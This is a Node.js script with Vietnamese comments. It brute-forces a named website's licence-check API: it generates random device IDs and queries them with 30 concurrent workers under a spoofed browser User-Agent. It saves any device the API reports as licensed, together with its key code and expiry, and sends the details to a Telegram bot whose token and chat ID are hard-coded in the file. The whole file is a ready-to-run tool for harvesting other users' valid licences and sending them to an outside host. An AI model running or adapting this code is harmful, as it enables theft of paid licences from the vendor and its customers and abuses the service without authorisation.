#!/usr/bin/env node

import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';
import readline from 'node:readline';

// ==========================================
// 1. CẤU HÌNH & THAM SỐ DÒNG LỆNH (CLI ARGS)
// ==========================================
const args = process.argv.slice(2);

function getArgValue(flag, defaultVal) {
  const index = args.findIndex(arg => arg === flag || arg.startsWith(`${flag}=`));
  if (index === -1) return defaultVal;
  if (args[index].includes('=')) {
    return args[index].split('=')[1];
  }
  return args[index + 1] !== undefined ? args[index + 1] : defaultVal;
}

const hasFlag = (flag) => args.includes(flag);

if (hasFlag('-h') || hasFlag('--help')) {
  console.log(`
==================================================================
  TOOL TỰ ĐỘNG TẠO & QUÉT DEVICE ID - VOHOAINAM.NET API
==================================================================
Cách sử dụng:
  node index.js [tùy chọn]

Tùy chọn:
  -c, --concurrency <số>   Số luồng chạy song song (mặc định: 30)
  -n, --limit <số>         Giới hạn tổng số thiết bị cần kiểm tra (0 = không giới hạn)
  -d, --delay <ms>         Thời gian nghỉ giữa các lượt mỗi luồng (mặc định: 0)
  -t, --timeout <ms>       Thời gian chờ tối đa cho 1 request (mặc định: 20000ms)
  -o, --output <file>      File lưu danh sách device_id hợp lệ (mặc định: authorized_devices.txt)
      --algo <regex|fast>  Thuật toán tạo UUID ('fast' crypto hoặc 'regex') (mặc định: fast)
      --tg-token <token>   Token Telegram Bot (mặc định: bot đã cấu hình)
      --tg-chat <chat_id>  Chat ID Telegram nhận thông báo (mặc định: 8855411031)
      --test-tg            Gửi tin nhắn test Telegram ngay khi bật tool
      --no-tg              Tắt gửi thông báo về Telegram
      --compact            Chế độ dashboard thu gọn 1 dòng (mặc định: in từng dòng log)
      --history-file <f>   File lưu lịch sử các mã đã test (mặc định: checked_history.txt)
      --no-history         Không lưu lịch sử ra file (chỉ chống lặp trong RAM)
      --clear-history      Xóa lịch sử đã quét trước đó và bắt đầu lại từ đầu
  -h, --help               Hiển thị bảng trợ giúp này

Ví dụ:
  node index.js                      # Quét mặc định 30 luồng, chống lặp 100%
  node index.js -c 10                # Quét với 10 luồng
  node index.js -c 5 -n 30           # Test thử 30 mã rồi dừng
  node index.js --test-tg            # Test gửi thông báo về Telegram
==================================================================
`);
  process.exit(0);
}

const CONFIG = {
  concurrency: parseInt(getArgValue('-c', getArgValue('--concurrency', '30')), 10),
  limit: parseInt(getArgValue('-n', getArgValue('--limit', '0')), 10),
  delayMs: parseInt(getArgValue('-d', getArgValue('--delay', '0')), 10),
  timeoutMs: parseInt(getArgValue('-t', getArgValue('--timeout', '20000')), 10),
  outputTxt: getArgValue('-o', getArgValue('--output', 'authorized_devices.txt')),
  outputJson: 'authorized_devices.json',
  algo: getArgValue('--algo', 'fast'),
  historyFile: getArgValue('--history-file', 'checked_history.txt'),
  saveHistory: !hasFlag('--no-history'),
  clearHistory: hasFlag('--clear-history'),
  telegramToken: getArgValue('--tg-token', '8814714783:AAEK9ZQ-QVp9ALZnkhfYD2yoS_ZE8b2SgWE'),
  telegramChatId: getArgValue('--tg-chat', '8855411031'),
  telegramEnabled: !hasFlag('--no-tg'),
  testTelegram: hasFlag('--test-tg'),
  compact: hasFlag('--compact'),
  apiUrl: 'https://vohoainam.net/api/check-auth?device_id='
};

// ==========================================
// 2. MÀU SẮC GIAO DIỆN TERMINAL
// ==========================================
const colors = {
  reset: '\x1b[0m',
  bright: '\x1b[1m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[36m',
  magenta: '\x1b[35m',
  red: '\x1b[31m',
  gray: '\x1b[90m',
  bgGreen: '\x1b[42m\x1b[30m',
  bgRed: '\x1b[41m\x1b[37m'
};

// ==========================================
// 3. LOGIC TẠO UUID & DEVICE ID THEO MÃ CỦA BẠN
// ==========================================
function generateUUIDOriginal() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = (Math.random() * 16) | 0;
    const v = c === 'x' ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

function generateUUIDCrypto() {
  return crypto.randomUUID();
}

function generateDeviceId() {
  const uuid = CONFIG.algo === 'fast' ? generateUUIDCrypto() : generateUUIDOriginal();
  return 'device_' + uuid;
}

// ==========================================
// 4. HỆ THỐNG CHỐNG TRÙNG LẶP (DEDUPLICATION)
// ==========================================
const checkedSet = new Set();
let historyWriteStream = null;

function initDeduplication() {
  if (CONFIG.clearHistory && fs.existsSync(CONFIG.historyFile)) {
    try {
      fs.unlinkSync(CONFIG.historyFile);
      console.log(`${colors.yellow}✔ Đã xóa lịch sử quét cũ theo yêu cầu (--clear-history).${colors.reset}`);
    } catch (e) {}
  }

  if (CONFIG.saveHistory && fs.existsSync(CONFIG.historyFile)) {
    try {
      const fileContent = fs.readFileSync(CONFIG.historyFile, 'utf8');
      const lines = fileContent.split(/\r?\n/);
      for (let i = 0; i < lines.length; i++) {
        const id = lines[i].trim();
        if (id) checkedSet.add(id);
      }
    } catch (err) {
      console.error('Không thể đọc file lịch sử:', err.message);
    }
  }

  if (CONFIG.saveHistory) {
    historyWriteStream = fs.createWriteStream(CONFIG.historyFile, { flags: 'a', encoding: 'utf8' });
  }
}

function generateUniqueDeviceId() {
  let deviceId;
  let attempts = 0;
  do {
    deviceId = generateDeviceId();
    attempts++;
    if (attempts > 100) break;
  } while (checkedSet.has(deviceId));

  checkedSet.add(deviceId);

  if (historyWriteStream) {
    historyWriteStream.write(deviceId + '\n');
  }

  return deviceId;
}

// ==========================================
// 4. THỐNG KÊ & THEO DÕI TIẾN ĐỘ
// ==========================================
const stats = {
  totalChecked: 0,
  authorizedFound: 0,
  errors: 0,
  startTime: Date.now(),
  lastCheckTime: Date.now(),
  lastRateCheckCount: 0,
  currentRps: 0
};

let isRunning = true;

// Tính toán tốc độ req/s mỗi giây
setInterval(() => {
  const now = Date.now();
  const timeDiff = (now - stats.lastCheckTime) / 1000;
  if (timeDiff >= 0.5) {
    const countDiff = stats.totalChecked - stats.lastRateCheckCount;
    stats.currentRps = Math.round(countDiff / timeDiff);
    stats.lastCheckTime = now;
    stats.lastRateCheckCount = stats.totalChecked;
  }
}, 1000).unref();

function formatDuration(ms) {
  const sec = Math.floor(ms / 1000);
  const h = Math.floor(sec / 3600);
  const m = Math.floor((sec % 3600) / 60);
  const s = sec % 60;
  return `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
}

function getCurrentSpeed() {
  if (stats.currentRps > 0) return `${stats.currentRps} req/s`;
  const elapsedSec = (Date.now() - stats.startTime) / 1000;
  if (elapsedSec > 0 && stats.totalChecked > 0) {
    return `${(stats.totalChecked / elapsedSec).toFixed(1)} req/s`;
  }
  return `0 req/s`;
}

// ==========================================
// 5. GỬI THÔNG BÁO VỀ TELEGRAM BOT
// ==========================================
async function sendTelegramAlert(data) {
  if (!CONFIG.telegramEnabled || !CONFIG.telegramToken || !CONFIG.telegramChatId) {
    return;
  }

  const timeFormatted = new Date().toLocaleString('vi-VN', {
    timeZone: 'Asia/Ho_Chi_Minh',
    hour12: false
  });

  const text = [
    `🎉 <b>PHÁT HIỆN THIẾT BỊ BẢN QUYỀN HỢP LỆ!</b>`,
    `━━━━━━━━━━━━━━━━━━━━━━`,
    `📱 <b>Device ID:</b> <code>${data.device_id}</code>`,
    `⏳ <b>Hết hạn:</b> <code>${data.expires_at || 'Vĩnh viễn'}</code>`,
    `🔑 <b>Key Code:</b> <code>${data.key_code || '(Ẩn)'}</code>`,
    `⏱ <b>Thời hạn:</b> <code>${data.duration || 'N/A'}</code>`,
    `🌐 <b>URL:</b> ${data.url || 'N/A'}`,
    `⏰ <b>Thời gian quét:</b> <code>${timeFormatted}</code>`,
    `━━━━━━━━━━━━━━━━━━━━━━`,
    `🤖 <i>Gửi tự động từ Device Auth Scanner</i>`
  ].join('\n');

  try {
    const res = await fetch(`https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CONFIG.telegramChatId,
        text,
        parse_mode: 'HTML'
      })
    });

    const result = await res.json();
    if (result.ok) {
      console.log(`${colors.green}✔ [TELEGRAM] Đã gửi thông báo thành công về Chat ID: ${CONFIG.telegramChatId}${colors.reset}\n`);
    } else {
      console.error(`${colors.red}✖ [TELEGRAM LỖI]: ${result.description}${colors.reset}\n`);
    }
  } catch (err) {
    console.error(`${colors.red}✖ [TELEGRAM LỖI KẾT NỐI]: ${err.message}${colors.reset}\n`);
  }
}

async function sendTelegramTest() {
  if (!CONFIG.telegramEnabled || !CONFIG.telegramToken || !CONFIG.telegramChatId) return;
  try {
    const timeFormatted = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh', hour12: false });
    const res = await fetch(`https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CONFIG.telegramChatId,
        text: `🟢 <b>Tool Quét Device ID Đã Kết Nối!</b>\n⏰ Thời gian: <code>${timeFormatted}</code>\n⚡ Sẵn sàng gửi thông báo khi tìm thấy thiết bị hợp lệ.`,
        parse_mode: 'HTML'
      })
    });
    const result = await res.json();
    if (result.ok) {
      console.log(`${colors.green}✔ Đã kiểm tra và kết nối Telegram Bot thành công! (Chat ID: ${CONFIG.telegramChatId})${colors.reset}\n`);
    } else {
      console.log(`${colors.yellow}⚠ Cảnh báo gửi tin nhắn Telegram: ${result.description}${colors.reset}\n`);
    }
  } catch (err) {
    console.log(`${colors.red}⚠ Lỗi kết nối Telegram Bot: ${err.message}${colors.reset}\n`);
  }
}

// ==========================================
// 6. LƯU KẾT QUẢ HỢP LỆ VÀO FILE
// ==========================================
function saveAuthorizedDevice(data) {
  const timestamp = new Date().toISOString();

  // 1. Lưu text dòng ngắn gọn dễ đọc
  const line = `[${timestamp}] DeviceID: ${data.device_id} | Expires: ${data.expires_at || 'Vĩnh viễn'} | Key: ${data.key_code || 'N/A'} | Duration: ${data.duration || 'N/A'} | URL: ${data.url || 'N/A'}\n`;
  fs.appendFileSync(CONFIG.outputTxt, line, 'utf8');

  // 2. Lưu file json cấu trúc đầy đủ
  try {
    let list = [];
    if (fs.existsSync(CONFIG.outputJson)) {
      const content = fs.readFileSync(CONFIG.outputJson, 'utf8').trim();
      if (content) {
        list = JSON.parse(content);
      }
    }
    list.push({ ...data, scanned_at: timestamp });
    fs.writeFileSync(CONFIG.outputJson, JSON.stringify(list, null, 2), 'utf8');
  } catch (err) {
    // Bỏ qua lỗi ghi file json nếu file đang bị lock
  }
}

// ==========================================
// 7. GIAO DIỆN COMPACT DASHBOARD (TÙY CHỌN --compact)
// ==========================================
function renderCompactDashboard() {
  if (!CONFIG.compact) return;
  const elapsed = formatDuration(Date.now() - stats.startTime);
  const limitStr = CONFIG.limit > 0 ? ` / ${CONFIG.limit}` : ' (không giới hạn)';

  const line =
    `${colors.blue}[${elapsed}]${colors.reset} ` +
    `Đã check: ${colors.bright}${stats.totalChecked}${limitStr}${colors.reset} | ` +
    `Tốc độ: ${colors.yellow}${stats.currentRps} req/s${colors.reset} | ` +
    `Đã tìm thấy: ${colors.green}${colors.bright}${stats.authorizedFound}${colors.reset} | ` +
    `Lỗi: ${colors.red}${stats.errors}${colors.reset} | ` +
    `Luồng: ${colors.bright}${CONFIG.concurrency}${colors.reset}`;

  if (process.stdout.isTTY) {
    readline.cursorTo(process.stdout, 0);
    process.stdout.write(line);
    readline.clearLine(process.stdout, 1);
  } else {
    process.stdout.write(`\r${line}`);
  }
}

// ==========================================
// 8. KIỂM TRA MỘT THIẾT BỊ (CHECK SINGLE REAL)
// ==========================================
async function checkDevice(deviceId, workerId) {
  const startTime = Date.now();
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), CONFIG.timeoutMs);

  const threadTag = `Luồng #${String(workerId + 1).padStart(2, '0')}`;
  const timeStr = new Date().toLocaleTimeString('vi-VN', { hour12: false });

  try {
    const url = CONFIG.apiUrl + encodeURIComponent(deviceId);
    const res = await fetch(url, {
      method: 'GET',
      headers: {
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
      },
      signal: controller.signal
    });

    clearTimeout(timer);
    const duration = Date.now() - startTime;
    stats.totalChecked++;

    if (!res.ok) {
      stats.errors++;
      if (!CONFIG.compact) {
        console.log(
          `${colors.gray}[${timeStr}]${colors.reset} ` +
          `${colors.magenta}[${threadTag}]${colors.reset} ` +
          `${colors.yellow}[${getCurrentSpeed()}]${colors.reset} ` +
          `Mã máy đã test là ${colors.bright}${deviceId}${colors.reset} -> ` +
          `${colors.red}[ LỖI HTTP ${res.status} ]${colors.reset} (${duration}ms)`
        );
      }
      return null;
    }

    const data = await res.json();

    // Kiểm tra tính xác thực thực tế từ API trả về
    const isAuthorized = data.authorized === true || (data.expires_at !== null && data.expires_at !== undefined);

    if (isAuthorized) {
      stats.authorizedFound++;
      saveAuthorizedDevice(data);

      if (!CONFIG.compact) {
        console.log(
          `${colors.blue}[${timeStr}]${colors.reset} ` +
          `${colors.magenta}[${threadTag}]${colors.reset} ` +
          `${colors.yellow}[${getCurrentSpeed()}]${colors.reset} ` +
          `Mã máy đã test là ${colors.bright}${deviceId}${colors.reset} -> ` +
          `${colors.bgGreen}${colors.bright} [ ĐÚNG ] ${colors.reset} (${duration}ms)`
        );
      }

      // Thông báo nổi bật trên Terminal
      console.log('\n' + '='.repeat(70));
      console.log(`${colors.bgGreen} [🎉 TÌM THẤY THIẾT BỊ CÓ BẢN QUYỀN HỢP LỆ!] ${colors.reset}`);
      console.log(`- Device ID:     ${colors.green}${colors.bright}${data.device_id}${colors.reset}`);
      console.log(`- Hết hạn vào:   ${colors.yellow}${data.expires_at || 'Vĩnh viễn'}${colors.reset}`);
      console.log(`- Key Code:      ${data.key_code || '(Ẩn)'}`);
      console.log(`- Thời hạn:      ${data.duration || 'N/A'}`);
      console.log(`- Đã lưu vào:    ${CONFIG.outputTxt} & ${CONFIG.outputJson}`);
      console.log('='.repeat(70) + '\n');

      // Gửi báo về Telegram
      await sendTelegramAlert(data);
    } else {
      if (!CONFIG.compact) {
        console.log(
          `${colors.gray}[${timeStr}]${colors.reset} ` +
          `${colors.magenta}[${threadTag}]${colors.reset} ` +
          `${colors.yellow}[${getCurrentSpeed()}]${colors.reset} ` +
          `Mã máy đã test là ${colors.bright}${deviceId}${colors.reset} -> ` +
          `${colors.red}[ SAI ]${colors.reset} (${duration}ms)`
        );
      }
    }

    return data;
  } catch (err) {
    clearTimeout(timer);
    const duration = Date.now() - startTime;
    stats.errors++;
    const errMsg = err.name === 'AbortError' ? 'Timeout' : err.message;
    if (!CONFIG.compact) {
      console.log(
        `${colors.gray}[${timeStr}]${colors.reset} ` +
        `${colors.magenta}[${threadTag}]${colors.reset} ` +
        `${colors.yellow}[${getCurrentSpeed()}]${colors.reset} ` +
        `Mã máy đã test là ${colors.bright}${deviceId}${colors.reset} -> ` +
        `${colors.red}[ LỖI: ${errMsg} ]${colors.reset} (${duration}ms)`
      );
    }
    return null;
  }
}

// ==========================================
// 9. QUẢN LÝ LUỒNG CHẠY HÀNG LOẠT (WORKER POOL)
// ==========================================
let allocatedCount = 0;

async function worker(workerId) {
  while (isRunning) {
    if (CONFIG.limit > 0) {
      allocatedCount++;
      if (allocatedCount > CONFIG.limit) {
        isRunning = false;
        break;
      }
    }

    const deviceId = generateUniqueDeviceId();
    await checkDevice(deviceId, workerId);

    if (CONFIG.compact) {
      renderCompactDashboard();
    }

    if (CONFIG.delayMs > 0) {
      await new Promise(resolve => setTimeout(resolve, CONFIG.delayMs));
    }
  }
}

// ==========================================
// 10. KHỞI CHẠY CHÍNH (MAIN ENTRY)
// ==========================================
async function main() {
  initDeduplication();

  console.log(`\n${colors.bright}==================================================================${colors.reset}`);
  console.log(`${colors.blue}${colors.bright}   TOOL QUÉT BẢN QUYỀN DEVICE ID - VOHOAINAM.NET API   ${colors.reset}`);
  console.log(`${colors.bright}==================================================================${colors.reset}`);
  console.log(`- Số luồng (Concurrency):  ${colors.yellow}${CONFIG.concurrency}${colors.reset}`);
  console.log(`- Giới hạn quét:           ${colors.yellow}${CONFIG.limit > 0 ? CONFIG.limit + ' thiết bị' : 'Không giới hạn (Ctrl+C để dừng)'}${colors.reset}`);
  console.log(`- Delay mỗi luồng:         ${colors.yellow}${CONFIG.delayMs}ms${colors.reset}`);
  console.log(`- Chống trùng lặp (RAM):   ${colors.green}BẬT (Cam kết 100% không trùng giữa các luồng)${colors.reset}`);
  console.log(`- Lịch sử đã quét (Disk):  ${CONFIG.saveHistory ? colors.green + 'Lưu tại ' + CONFIG.historyFile + ' (Đã nạp ' + checkedSet.size + ' mã cũ)' + colors.reset : colors.yellow + 'Tắt' + colors.reset}`);
  console.log(`- Báo Telegram Bot:        ${CONFIG.telegramEnabled ? colors.green + 'BẬT (Chat ID: ' + CONFIG.telegramChatId + ')' + colors.reset : colors.red + 'TẮT' + colors.reset}`);
  console.log(`- File kết quả:            ${colors.green}${CONFIG.outputTxt}${colors.reset}`);
  console.log(`- Chế độ log:              ${CONFIG.compact ? colors.yellow + 'Dashboard 1 dòng' + colors.reset : colors.green + 'Log từng dòng chi tiết (Mã máy, đúng/sai, time, tốc độ luồng)' + colors.reset}`);
  console.log(`- API Endpoint:            ${colors.gray}${CONFIG.apiUrl}<device_id>${colors.reset}`);
  console.log(`${colors.bright}------------------------------------------------------------------${colors.reset}\n`);

  if (CONFIG.testTelegram) {
    console.log(`${colors.yellow}Đang gửi tin nhắn kiểm tra Telegram...${colors.reset}`);
    await sendTelegramTest();
  }

  // Bắt sự kiện Ctrl + C để dừng an toàn và in bảng tổng kết
  const shutdown = () => {
    if (!isRunning) return;
    isRunning = false;
    if (historyWriteStream) {
      try { historyWriteStream.end(); } catch (e) {}
    }
    process.stdout.write('\n\n');
    console.log(`${colors.yellow}Đang dừng các luồng, vui lòng đợi giây lát...${colors.reset}`);

    setTimeout(() => {
      printSummary();
      process.exit(0);
    }, 500);
  };

  process.on('SIGINT', shutdown);
  process.on('SIGTERM', shutdown);

  // Tạo các worker chạy đồng thời
  const workers = [];
  for (let i = 0; i < CONFIG.concurrency; i++) {
    workers.push(worker(i));
  }

  // Cập nhật compact dashboard định kỳ nếu bật compact
  let dashboardInterval = null;
  if (CONFIG.compact) {
    dashboardInterval = setInterval(renderCompactDashboard, 250);
  }

  // Đợi cho tất cả worker hoàn thành (nếu có đặt limit)
  await Promise.all(workers);
  if (dashboardInterval) clearInterval(dashboardInterval);
  if (historyWriteStream) {
    try { historyWriteStream.end(); } catch (e) {}
  }

  printSummary();
}

function printSummary() {
  const elapsed = formatDuration(Date.now() - stats.startTime);
  const avgRps = stats.totalChecked > 0
    ? (stats.totalChecked / ((Date.now() - stats.startTime) / 1000)).toFixed(1)
    : 0;

  console.log(`\n${colors.bright}====================== BÁO CÁO KẾT QUẢ ======================${colors.reset}`);
  console.log(`- Tổng thời gian chạy:         ${colors.blue}${elapsed}${colors.reset}`);
  console.log(`- Tổng số mã đã kiểm tra:      ${colors.bright}${stats.totalChecked}${colors.reset}`);
  console.log(`- Tổng mã duy nhất trong Set:  ${colors.bright}${checkedSet.size}${colors.reset}`);
  console.log(`- Tốc độ trung bình:           ${colors.yellow}${avgRps} req/s${colors.reset}`);
  console.log(`- Số thiết bị đúng (hợp lệ):   ${colors.green}${colors.bright}${stats.authorizedFound}${colors.reset}`);
  console.log(`- Số lần lỗi mạng/timeout:     ${colors.red}${stats.errors}${colors.reset}`);
  if (stats.authorizedFound > 0) {
    console.log(`- Chi tiết đã lưu tại:         ${colors.green}${CONFIG.outputTxt}${colors.reset}`);
    console.log(`- Đã báo về Telegram Chat ID:  ${colors.green}${CONFIG.telegramChatId}${colors.reset}`);
  }
  console.log(`${colors.bright}=============================================================${colors.reset}\n`);
}

main().catch(err => {
  console.error('Lỗi nghiêm trọng:', err);
  process.exit(1);
});
